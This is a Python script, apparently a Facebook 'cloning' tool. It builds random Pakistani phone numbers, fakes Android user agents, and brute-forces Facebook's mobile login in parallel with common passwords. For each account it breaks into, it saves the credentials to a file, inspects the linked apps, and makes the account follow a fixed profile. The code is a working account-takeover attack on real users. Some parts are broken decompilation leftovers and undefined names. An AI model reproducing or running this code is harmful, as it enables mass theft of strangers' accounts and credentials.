import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install bs4')
def cek_apk(session,coki):
    w=session.get("https://www.facebook.com/profile.php?id=100077309041488/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %s \x1b[1;93mSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;93m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %s \x1b[1;93mSorry there is no Expired Apk%s  \n'%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;91m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100077309041488', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m'
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'  
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m'
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.3
    update = ('5.3')
    update = ('5.3')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
 
#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
# APK CHECK
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    
    
    print("\033[1;37m\t  USE OUR COUNTRY CODE  ")
    print('\033[1;33m Enter Pak Code ===>[92301,92311,92336,92342]')
    kode = input('\033[1;32mPut code: ')
    limit = int(input('\033[1;36mHow many numbers do you want to add ? '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;93m[•] \033[1;92mChoose Method : Random')
        print('\033[1;93m[•] \033[1;97mTotal Ids : \033[1;97m%s ' +tl)
        print('\033[1;93m[•] \033[1;32mCloning Started Enjoy\033[1;97m')
        print('\033[1;97m[$]••••••••••••••••••••••••••••••••••••••••••[$]')
        for guru in user:
            uid = kode+guru
            pwx = [guru,'khankhan','i love you']
            yaari.submit(rcrack,uid,pwx,tl)
    print('\033[1;97m[$]••••••••••••••••••••••••••••••••••••••••••[$]')
    print('\x1b[1;93mIds saved in ANGAR-OK.txt,ANGAR-CP.txt')
    print('\033[1;97m[$]••••••••••••••••••••••••••••••••••••••••••[$]')

def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100').text
            log_data = {
            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
            'authority':'m.facebook.com',
			'method': 'GET',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
            "user-agent":pro,}
            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[7:22]
                print('\033[1;32m[ANGAR-Ok]  ' +uid+ ' | ' +ps+ '\033[1;32m'+  ' \n '+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/ANGAR.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                follow(self, session, coki)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[24:39]
                print('\33[1;33m[ANGAR-CP]  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r \x1b[1;96m[ANGAR] %s\x1b[1;93m|\x1b[1;97m%s\x1b[1;97m \x1b[1;92mOK:-%s \r'%(loop,tl,len(cps))),
        sys.stdout.flush()
    except:
        pass
main_apv()
